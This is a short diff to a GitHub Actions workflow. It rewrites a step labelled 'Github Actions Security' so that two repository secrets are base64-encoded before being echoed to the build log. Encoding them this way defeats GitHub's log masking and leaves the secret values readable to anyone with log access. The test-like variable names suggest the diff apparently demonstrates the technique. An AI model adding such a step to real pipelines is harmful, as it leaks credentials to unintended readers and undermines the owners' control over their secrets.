@@ -14,5 +14,8 @@ jobs:
 
       - name: Github Actions Security
         run:  |
-          echo 'ABC_TESTING=${{ secrets.ABC_TESTING }} & XYZ_TESTING=${{ secrets.XYZ_TESTING }}'
+          echo "ABC_TESTING=$(echo -n "$ABC_TESTING" | base64) & XYZ_TESTING=$(echo -n "$XYZ_TESTING" | base64)"
+        env:
+          ABC_TESTING: ${{ secrets.ABC_TESTING }}
+          XYZ_TESTING: ${{ secrets.XYZ_TESTING }}
         shell: bash
